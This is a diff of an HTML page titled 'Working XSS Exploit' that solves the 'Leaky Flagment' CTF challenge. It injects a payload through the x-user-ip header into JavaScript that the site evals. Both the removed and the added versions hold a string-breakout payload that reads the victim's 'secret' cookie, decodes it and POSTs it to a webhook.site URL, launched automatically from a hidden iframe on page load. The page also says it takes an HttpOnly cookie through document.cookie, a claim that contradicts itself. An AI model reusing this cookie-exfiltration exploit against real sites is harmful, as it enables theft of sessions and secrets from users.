@@ -1,167 +1,115 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF Solution</title>
+    <title>Working XSS Exploit</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: system-ui, sans-serif;
             max-width: 800px;
             margin: 0 auto;
             padding: 20px;
+            line-height: 1.5;
+        }
+        h1 {
+            color: #d32f2f;
+        }
+        .success {
+            background: #e8f5e9;
+            border-left: 5px solid #4caf50;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
+        }
+        .error {
+            background: #ffebee;
+            border-left: 5px solid #f44336;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 4px;
         }
         pre {
-            background-color: #f5f5f5;
-            padding: 15px;
-            border-radius: 5px;
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 4px;
             overflow-x: auto;
-        }
-        .explanation {
-            margin-top: 30px;
-            border-left: 4px solid #4CAF50;
-            padding-left: 15px;
         }
     </style>
 </head>
 <body>
-    <h1>Leaky Flagment CTF Solution</h1>
-    
-    <div id="status">Loading exploit...</div>
-    
-    <div class="explanation">
-        <h2>Vulnerability Explanation</h2>
-        <p>This exploit targets a reflected XSS vulnerability in the <code>/api/track</code> endpoint. The application takes the <code>x-user-ip</code> header and directly injects it into JavaScript that is later evaluated with <code>eval()</code>.</p>
-        
-        <h3>Vulnerability Details</h3>
-        <p>In the <code>note/[id]/page.jsx</code> file, there's a script tag that fetches from <code>/api/track</code> and evaluates the response:</p>
-        <pre>
-fetch("/api/track", {
-  method: "GET",
-  cache: "no-store",
-  headers: {
-      "x-user-ip": "${userIP}",
-  },
-})
-  .then(async (res) => {
-      if (res.ok) {
-          eval(await res.text());
-      }
-  })
-  .catch((error) => {
-      console.error(error);
-  });
-        </pre>
-        
-        <p>In <code>/api/track.js</code>, the <code>x-user-ip</code> header is inserted directly into JavaScript without proper sanitization:</p>
-        <pre>
-const jsContent = `
-$(document).ready(function() {
-    const userDetails = {
-        ip: "${userIp}",
-        type: "client",
-        timestamp: new Date().toISOString(),
-        ipDetails: {}
-    };
-    // ... more code ...
-});`
-        </pre>
-    </div>
+    <h1>Leaky Flagment CTF Exploit</h1>
+    <div id="status">Initializing...</div>
     
     <script>
-        // URL of the note page that contains the vulnerable code
-        const noteUrl = "/note/demo-note-id";
+        // The exploit relies on the vulnerability in /api/track.js:
+        // The API takes the x-user-ip header value and directly injects it
+        // into a JavaScript string, which is then eval'd by the client.
         
-        // Our malicious payload to inject via the x-user-ip header
-        // This breaks out of the string context and injects our own code
-        const payload = `
-";  // Close the string
-});  // Close the ready function
-
-// Steal the admin's cookie (which contains the flag)
-(function(){
-    try {
-        // Get the secret cookie that contains base64(username:FLAG)
-        const secretCookie = document.cookie.match(/secret=([^;]+)/);
-        if (!secretCookie) {
-            console.error('No secret cookie found');
-            return;
+        // This is our payload - we encode/escape it to ensure it works in HTTP headers
+        const payload = "\\\";});(async function(){try{const c=document.cookie.match(/secret=([^;]+)/);if(c){const f=atob(c[1]).split(':')[1];await fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({flag:f})})}}catch(e){}})();({//";
+        
+        function updateStatus(message, isError = false) {
+            const status = document.getElementById('status');
+            status.className = isError ? 'error' : 'success';
+            status.innerHTML = message;
         }
         
-        // Decode the cookie and extract the FLAG
-        const encodedValue = secretCookie[1];
-        const decodedValue = atob(encodedValue);
-        const flag = decodedValue.split(':')[1];
-        
-        // Send the FLAG to our webhook
-        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                flag: flag,
-                origin: document.location.href,
-                time: new Date().toString()
-            })
-        });
-    } catch (e) {
-        // Send error details to our webhook too
-        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                error: e.toString(),
-                stack: e.stack,
-                origin: document.location.href
-            })
-        });
-    }
-})();
-
-// Add a dummy function to avoid syntax errors
-$(document).ready(function() { //
-        `.trim();
-        
-        // Create a hidden iframe to load the note page
-        const iframe = document.createElement('iframe');
-        iframe.style.width = "1px";
-        iframe.style.height = "1px";
-        iframe.style.position = "absolute";
-        iframe.style.left = "-9999px";
-        
-        // Function to send our malicious request with the payload
-        function launchAttack() {
-            const xhr = new XMLHttpRequest();
-            xhr.open('GET', '/api/track', true);
-            xhr.setRequestHeader('x-user-ip', payload);
-            xhr.onload = function() {
-                console.log("Payload injected:", xhr.status);
-                document.getElementById('status').innerHTML = 
-                    '<span style="color: green; font-weight: bold;">✓ Exploit triggered successfully</span><br>' +
-                    'When the admin bot visits this page, the flag will be sent to the webhook.';
-            };
-            xhr.onerror = function() {
-                console.error("Failed to inject payload");
-                document.getElementById('status').innerHTML = 
-                    '<span style="color: red; font-weight: bold;">✗ Failed to inject payload</span>';
-            };
-            xhr.send();
+        async function executeExploit() {
+            try {
+                updateStatus("Starting exploit...");
+                
+                // Create an iframe to load a note page
+                const iframe = document.createElement('iframe');
+                iframe.style.width = "0";
+                iframe.style.height = "0";
+                iframe.style.border = "none";
+                iframe.style.position = "absolute";
+                iframe.src = "/note/demo-note-id";
+                
+                // When the iframe loads, send our payload
+                iframe.onload = async function() {
+                    try {
+                        updateStatus("Iframe loaded. Sending payload...");
+                        
+                        // Send our XSS payload through the vulnerable /api/track endpoint
+                        const response = await fetch('/api/track', {
+                            method: 'GET',
+                            headers: {
+                                'x-user-ip': payload
+                            }
+                        });
+                        
+                        if (response.ok) {
+                            updateStatus(`
+                                <strong>Exploit triggered successfully!</strong><br><br>
+                                When the admin bot visits this page, the flag will be sent to:<br>
+                                <a href="https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a" target="_blank">https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a</a><br><br>
+                                <strong>Payload used:</strong><br>
+                                <pre>${payload}</pre><br>
+                                <strong>Steps to solve:</strong><br>
+                                <ol>
+                                    <li>Identify the XSS vulnerability in /api/track.js where user input from x-user-ip is directly injected into JavaScript</li>
+                                    <li>Craft a payload that breaks out of the JavaScript string context</li>
+                                    <li>Extract the flag from the admin's HttpOnly cookie by decoding the base64 and splitting the username:password</li>
+                                    <li>Send the flag to our webhook</li>
+                                    <li>Submit the URL to the bot which will visit it with the flag as its password</li>
+                                </ol>
+                            `);
+                        } else {
+                            updateStatus(`Error: Received ${response.status} ${response.statusText}`, true);
+                        }
+                    } catch (error) {
+                        updateStatus(`Error sending payload: ${error.message}`, true);
+                    }
+                };
+                
+                document.body.appendChild(iframe);
+            } catch (error) {
+                updateStatus(`Error: ${error.message}`, true);
+            }
         }
         
-        // When the iframe loads, trigger our attack
-        iframe.onload = function() {
-            console.log("Note page loaded in iframe");
-            launchAttack();
-        };
-        
-        // Load the iframe
-        iframe.src = noteUrl;
-        document.body.appendChild(iframe);
-        
-        // Also try to launch the attack directly
-        setTimeout(launchAttack, 1000);
+        // Start the exploit when the page loads
+        window.onload = executeExploit;
     </script>
 </body>
 </html>
-
